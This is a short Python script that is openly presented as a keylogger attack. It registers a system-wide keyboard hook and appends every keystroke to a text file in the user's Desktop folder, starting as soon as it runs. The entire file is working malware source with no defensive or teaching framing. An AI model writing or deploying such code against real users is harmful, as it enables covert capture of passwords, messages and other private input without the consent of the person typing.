import keyboard
from pathlib import Path

class KeyLogger():
    """A class which represents a keylogger attack which records the user's keyboard typing."""

    def __init__(self, folder="Desktop", filename="keylog.txt"):
        self.recordFilePath = Path.home() / folder / filename
        self.recordFile = open(self.recordFilePath, 'a')

    def record(self, event):
        # Records the keyboard input and saves it to the record file.
        typedBtn = event.name
        
        # Fixing the input for special keys
        if typedBtn == "space":
            typedBtn = " "
        elif typedBtn == "enter":
            typedBtn = "\n"
        
        self.recordFile.write(typedBtn)
        self.recordFile.flush()

    def start_recording(self):
        #Starts recording the keyboard input.
        keyboard.on_release(callback=self.record)
        keyboard.wait()

key_logger = KeyLogger(folder="Desktop", filename="keylog.txt")
key_logger.start_recording()
